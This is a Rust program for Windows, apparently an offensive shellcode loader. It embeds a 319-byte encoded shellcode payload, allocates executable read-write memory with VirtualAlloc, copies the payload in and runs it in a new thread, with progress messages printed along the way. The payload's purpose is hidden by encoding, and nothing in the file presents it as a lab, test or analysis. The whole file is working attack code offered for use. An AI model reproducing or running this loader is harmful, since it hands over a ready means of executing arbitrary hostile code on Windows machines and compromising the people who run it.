use std::{ffi::c_void, process::ExitCode};
use windows::Win32::{
    Foundation::{CloseHandle, WAIT_FAILED, WAIT_OBJECT_0},
    System::{
        Memory::{
            MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc, VirtualFree,
        },
        Threading::{
            CreateThread, GetCurrentProcessId, INFINITE, LPTHREAD_START_ROUTINE,
            THREAD_CREATION_FLAGS, WaitForSingleObject,
        },
    },
};

fn main() -> ExitCode {
    match run() {
        Ok(()) => ExitCode::SUCCESS,
        Err(error) => {
            eprintln!("[!] {error}");
            ExitCode::FAILURE
        }
    }
}

fn run() -> Result<(), String> {
    let shellcode_bytes: &[u8; 319] = b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\
\xff\xff\xff\x48\xbb\x96\x8b\xf3\xfe\x54\x84\x2f\x47\x48\
\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x6a\xc3\x70\
\x1a\xa4\x6c\xef\x47\x96\x8b\xb2\xaf\x15\xd4\x7d\x16\xc0\
\xc3\xc2\x2c\x31\xcc\xa4\x15\xf6\xc3\x78\xac\x4c\xcc\xa4\
\x15\xb6\xc3\x78\x8c\x04\xcc\x20\xf0\xdc\xc1\xbe\xcf\x9d\
\xcc\x1e\x87\x3a\xb7\x92\x82\x56\xa8\x0f\x06\x57\x42\xfe\
\xbf\x55\x45\xcd\xaa\xc4\xca\xa2\xb6\xdf\xd6\x0f\xcc\xd4\
\xb7\xbb\xff\x84\x0f\xaf\xcf\x96\x8b\xf3\xb6\xd1\x44\x5b\
\x20\xde\x8a\x23\xae\xdf\xcc\x37\x03\x1d\xcb\xd3\xb7\x55\
\x54\xcc\x11\xde\x74\x3a\xbf\xdf\xb0\xa7\x0f\x97\x5d\xbe\
\xcf\x9d\xcc\x1e\x87\x3a\xca\x32\x37\x59\xc5\x2e\x86\xae\
\x6b\x86\x0f\x18\x87\x63\x63\x9e\xce\xca\x2f\x21\x5c\x77\
\x03\x1d\xcb\xd7\xb7\x55\x54\x49\x06\x1d\x87\xbb\xba\xdf\
\xc4\x33\x0e\x97\x5b\xb2\x75\x50\x0c\x67\x46\x46\xca\xab\
\xbf\x0c\xda\x76\x1d\xd7\xd3\xb2\xa7\x15\xde\x67\xc4\x7a\
\xab\xb2\xac\xab\x64\x77\x06\xcf\xd1\xbb\x75\x46\x6d\x78\
\xb8\x69\x74\xae\xb6\xee\x85\x2f\x47\x96\x8b\xf3\xfe\x54\
\xcc\xa2\xca\x97\x8a\xf3\xfe\x15\x3e\x1e\xcc\xf9\x0c\x0c\
\x2b\xef\x49\x4b\xd8\xfe\xca\x49\x58\xc1\x39\xb2\xb8\x43\
\xc3\x70\x3a\x7c\xb8\x29\x3b\x9c\x0b\x08\x1e\x21\x81\x94\
\x00\x85\xf9\x9c\x94\x54\xdd\x6e\xce\x4c\x74\x26\x9d\x35\
\xe8\x4c\x69\xf3\xf3\x96\xfe\x54\x84\x2f\x47";


    let pid = unsafe { GetCurrentProcessId() };
    println!("[+] PID of running process: {pid}");

    let allocation = unsafe {
        VirtualAlloc(
            None,
            shellcode_bytes.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if allocation.is_null() {
        return Err(format!(
            "VirtualAlloc failed: {}",
            windows::core::Error::from_thread()
        ));
    }
    println!("[+] Allocated local memory at: {allocation:p}");

    unsafe {
        std::ptr::copy_nonoverlapping(
            shellcode_bytes.as_ptr(),
            allocation.cast::<u8>(),
            shellcode_bytes.len(),
        );
    }
    println!("[+] Copied {} bytes to local memory", shellcode_bytes.len());

    let start_routine =
        unsafe { std::mem::transmute::<*mut c_void, LPTHREAD_START_ROUTINE>(allocation) };

    let thread =
        match unsafe { CreateThread(None, 0, start_routine, None, THREAD_CREATION_FLAGS(0), None) }
        {
            Ok(thread) => thread,
            Err(error) => {
                let mut message = format!("CreateThread failed: {error}");
                if let Err(cleanup_error) = unsafe { VirtualFree(allocation, 0, MEM_RELEASE) } {
                    message.push_str(&format!("; VirtualFree failed: {cleanup_error}"));
                }
                return Err(message);
            }
        };
    println!("[+] Local thread created; waiting for it to finish");

    let wait_result = unsafe { WaitForSingleObject(thread, INFINITE) };
    if wait_result != WAIT_OBJECT_0 {
        let mut message = if wait_result == WAIT_FAILED {
            format!(
                "WaitForSingleObject failed: {}",
                windows::core::Error::from_thread()
            )
        } else {
            format!("WaitForSingleObject returned unexpected status: {wait_result:?}")
        };

        if let Err(error) = unsafe { CloseHandle(thread) } {
            message.push_str(&format!("; CloseHandle failed: {error}"));
        }
        message.push_str("; thread completion is unconfirmed, leaving memory for process teardown");
        return Err(message);
    }
    println!("[+] Thread finished");

    let mut cleanup_errors = Vec::new();
    if let Err(error) = unsafe { CloseHandle(thread) } {
        cleanup_errors.push(format!("CloseHandle failed: {error}"));
    }
    if let Err(error) = unsafe { VirtualFree(allocation, 0, MEM_RELEASE) } {
        cleanup_errors.push(format!("VirtualFree failed: {error}"));
    }
    if !cleanup_errors.is_empty() {
        return Err(cleanup_errors.join("; "));
    }
    println!("[+] Thread handle closed and local memory released");
    Ok(())
}
